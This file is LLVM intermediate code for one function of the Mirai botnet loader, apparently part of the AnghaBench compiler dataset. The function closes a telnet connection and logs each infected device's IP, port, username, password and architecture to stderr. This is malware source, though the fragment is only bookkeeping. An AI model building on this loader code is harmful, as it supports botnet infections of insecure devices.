; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_close.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_connection.c_connection_close.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.connection = type { i32, i32, i32, %struct.TYPE_6__*, %struct.TYPE_5__, i64, i64, i32, i8*, i8*, i8*, i64, %struct.TYPE_4__ }
%struct.TYPE_6__ = type { i32, i32, i32 }
%struct.TYPE_5__ = type { i32, i8*, i8*, i8*, i32 }
%struct.TYPE_4__ = type { i64, i32 }

@FALSE = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [13 x i8] c"srv == NULL\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [28 x i8] c"OK|%d.%d.%d.%d:%d %s:%s %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"ERR|%d.%d.%d.%d:%d %s:%s %s|%d\0A\00", align 1
@TELNET_CLOSED = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @connection_close(%struct.connection* %0) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 2
  %5 = call i32 @pthread_mutex_lock(i32* %4)
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 10
  %8 = load i8*, i8** %7, align 8
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %147

10:                                               ; preds = %1
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 12
  %13 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 1
  %14 = load i32, i32* %13, align 8
  %15 = call i32 @memset(i32 %14, i32 0, i32 4)
  %16 = load %struct.connection*, %struct.connection** %2, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 12
  %18 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %17, i32 0, i32 0
  store i64 0, i64* %18, align 8
  %19 = load %struct.connection*, %struct.connection** %2, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 11
  store i64 0, i64* %20, align 8
  %21 = load i8*, i8** @FALSE, align 8
  %22 = load %struct.connection*, %struct.connection** %2, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 10
  store i8* %21, i8** %23, align 8
  %24 = load i8*, i8** @FALSE, align 8
  %25 = load %struct.connection*, %struct.connection** %2, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 9
  store i8* %24, i8** %26, align 8
  %27 = load i8*, i8** @FALSE, align 8
  %28 = load %struct.connection*, %struct.connection** %2, align 8
  %29 = getelementptr inbounds %struct.connection, %struct.connection* %28, i32 0, i32 8
  store i8* %27, i8** %29, align 8
  %30 = load %struct.connection*, %struct.connection** %2, align 8
  %31 = getelementptr inbounds %struct.connection, %struct.connection* %30, i32 0, i32 7
  %32 = load i32, i32* %31, align 8
  %33 = call i32 @memset(i32 %32, i32 0, i32 4)
  %34 = load %struct.connection*, %struct.connection** %2, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 6
  store i64 0, i64* %35, align 8
  %36 = load %struct.connection*, %struct.connection** %2, align 8
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %36, i32 0, i32 3
  %38 = load %struct.TYPE_6__*, %struct.TYPE_6__** %37, align 8
  %39 = icmp eq %struct.TYPE_6__* %38, null
  br i1 %39, label %40, label %42

40:                                               ; preds = %10
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  br label %171

42:                                               ; preds = %10
  %43 = load %struct.connection*, %struct.connection** %2, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 5
  %45 = load i64, i64* %44, align 8
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %95

47:                                               ; preds = %42
  %48 = load %struct.connection*, %struct.connection** %2, align 8
  %49 = getelementptr inbounds %struct.connection, %struct.connection* %48, i32 0, i32 3
  %50 = load %struct.TYPE_6__*, %struct.TYPE_6__** %49, align 8
  %51 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %50, i32 0, i32 2
  %52 = call i32 @ATOMIC_INC(i32* %51)
  %53 = load i32, i32* @stderr, align 4
  %54 = load %struct.connection*, %struct.connection** %2, align 8
  %55 = getelementptr inbounds %struct.connection, %struct.connection* %54, i32 0, i32 4
  %56 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 8
  %58 = and i32 %57, 255
  %59 = load %struct.connection*, %struct.connection** %2, align 8
  %60 = getelementptr inbounds %struct.connection, %struct.connection* %59, i32 0, i32 4
  %61 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 8
  %63 = ashr i32 %62, 8
  %64 = and i32 %63, 255
  %65 = load %struct.connection*, %struct.connection** %2, align 8
  %66 = getelementptr inbounds %struct.connection, %struct.connection* %65, i32 0, i32 4
  %67 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 8
  %69 = ashr i32 %68, 16
  %70 = and i32 %69, 255
  %71 = load %struct.connection*, %struct.connection** %2, align 8
  %72 = getelementptr inbounds %struct.connection, %struct.connection* %71, i32 0, i32 4
  %73 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %72, i32 0, i32 0
  %74 = load i32, i32* %73, align 8
  %75 = ashr i32 %74, 24
  %76 = and i32 %75, 255
  %77 = load %struct.connection*, %struct.connection** %2, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 4
  %79 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %78, i32 0, i32 4
  %80 = load i32, i32* %79, align 8
  %81 = call i32 @ntohs(i32 %80)
  %82 = load %struct.connection*, %struct.connection** %2, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 4
  %84 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %83, i32 0, i32 1
  %85 = load i8*, i8** %84, align 8
  %86 = load %struct.connection*, %struct.connection** %2, align 8
  %87 = getelementptr inbounds %struct.connection, %struct.connection* %86, i32 0, i32 4
  %88 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %87, i32 0, i32 2
  %89 = load i8*, i8** %88, align 8
  %90 = load %struct.connection*, %struct.connection** %2, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 4
  %92 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %91, i32 0, i32 3
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 (i32, i8*, i32, i32, i32, i32, i32, i8*, i8*, i8*, ...) @fprintf(i32 %53, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i32 %58, i32 %64, i32 %70, i32 %76, i32 %81, i8* %85, i8* %89, i8* %93)
  br label %146

95:                                               ; preds = %42
  %96 = load %struct.connection*, %struct.connection** %2, align 8
  %97 = getelementptr inbounds %struct.connection, %struct.connection* %96, i32 0, i32 3
  %98 = load %struct.TYPE_6__*, %struct.TYPE_6__** %97, align 8
  %99 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %98, i32 0, i32 1
  %100 = call i32 @ATOMIC_INC(i32* %99)
  %101 = load i32, i32* @stderr, align 4
  %102 = load %struct.connection*, %struct.connection** %2, align 8
  %103 = getelementptr inbounds %struct.connection, %struct.connection* %102, i32 0, i32 4
  %104 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %103, i32 0, i32 0
  %105 = load i32, i32* %104, align 8
  %106 = and i32 %105, 255
  %107 = load %struct.connection*, %struct.connection** %2, align 8
  %108 = getelementptr inbounds %struct.connection, %struct.connection* %107, i32 0, i32 4
  %109 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %108, i32 0, i32 0
  %110 = load i32, i32* %109, align 8
  %111 = ashr i32 %110, 8
  %112 = and i32 %111, 255
  %113 = load %struct.connection*, %struct.connection** %2, align 8
  %114 = getelementptr inbounds %struct.connection, %struct.connection* %113, i32 0, i32 4
  %115 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %114, i32 0, i32 0
  %116 = load i32, i32* %115, align 8
  %117 = ashr i32 %116, 16
  %118 = and i32 %117, 255
  %119 = load %struct.connection*, %struct.connection** %2, align 8
  %120 = getelementptr inbounds %struct.connection, %struct.connection* %119, i32 0, i32 4
  %121 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %120, i32 0, i32 0
  %122 = load i32, i32* %121, align 8
  %123 = ashr i32 %122, 24
  %124 = and i32 %123, 255
  %125 = load %struct.connection*, %struct.connection** %2, align 8
  %126 = getelementptr inbounds %struct.connection, %struct.connection* %125, i32 0, i32 4
  %127 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %126, i32 0, i32 4
  %128 = load i32, i32* %127, align 8
  %129 = call i32 @ntohs(i32 %128)
  %130 = load %struct.connection*, %struct.connection** %2, align 8
  %131 = getelementptr inbounds %struct.connection, %struct.connection* %130, i32 0, i32 4
  %132 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %131, i32 0, i32 1
  %133 = load i8*, i8** %132, align 8
  %134 = load %struct.connection*, %struct.connection** %2, align 8
  %135 = getelementptr inbounds %struct.connection, %struct.connection* %134, i32 0, i32 4
  %136 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %135, i32 0, i32 2
  %137 = load i8*, i8** %136, align 8
  %138 = load %struct.connection*, %struct.connection** %2, align 8
  %139 = getelementptr inbounds %struct.connection, %struct.connection* %138, i32 0, i32 4
  %140 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %139, i32 0, i32 3
  %141 = load i8*, i8** %140, align 8
  %142 = load %struct.connection*, %struct.connection** %2, align 8
  %143 = getelementptr inbounds %struct.connection, %struct.connection* %142, i32 0, i32 1
  %144 = load i32, i32* %143, align 4
  %145 = call i32 (i32, i8*, i32, i32, i32, i32, i32, i8*, i8*, i8*, ...) @fprintf(i32 %101, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i32 %106, i32 %112, i32 %118, i32 %124, i32 %129, i8* %133, i8* %137, i8* %141, i32 %144)
  br label %146

146:                                              ; preds = %95, %47
  br label %147

147:                                              ; preds = %146, %1
  %148 = load i32, i32* @TELNET_CLOSED, align 4
  %149 = load %struct.connection*, %struct.connection** %2, align 8
  %150 = getelementptr inbounds %struct.connection, %struct.connection* %149, i32 0, i32 1
  store i32 %148, i32* %150, align 4
  %151 = load %struct.connection*, %struct.connection** %2, align 8
  %152 = getelementptr inbounds %struct.connection, %struct.connection* %151, i32 0, i32 0
  %153 = load i32, i32* %152, align 8
  %154 = icmp ne i32 %153, -1
  br i1 %154, label %155, label %167

155:                                              ; preds = %147
  %156 = load %struct.connection*, %struct.connection** %2, align 8
  %157 = getelementptr inbounds %struct.connection, %struct.connection* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = call i32 @close(i32 %158)
  %160 = load %struct.connection*, %struct.connection** %2, align 8
  %161 = getelementptr inbounds %struct.connection, %struct.connection* %160, i32 0, i32 0
  store i32 -1, i32* %161, align 8
  %162 = load %struct.connection*, %struct.connection** %2, align 8
  %163 = getelementptr inbounds %struct.connection, %struct.connection* %162, i32 0, i32 3
  %164 = load %struct.TYPE_6__*, %struct.TYPE_6__** %163, align 8
  %165 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %164, i32 0, i32 0
  %166 = call i32 @ATOMIC_DEC(i32* %165)
  br label %167

167:                                              ; preds = %155, %147
  %168 = load %struct.connection*, %struct.connection** %2, align 8
  %169 = getelementptr inbounds %struct.connection, %struct.connection* %168, i32 0, i32 2
  %170 = call i32 @pthread_mutex_unlock(i32* %169)
  br label %171

171:                                              ; preds = %167, %40
  ret void
}

declare dso_local i32 @pthread_mutex_lock(i32*) #1

declare dso_local i32 @memset(i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @ATOMIC_INC(i32*) #1

declare dso_local i32 @fprintf(i32, i8*, i32, i32, i32, i32, i32, i8*, i8*, i8*, ...) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @ATOMIC_DEC(i32*) #1

declare dso_local i32 @pthread_mutex_unlock(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
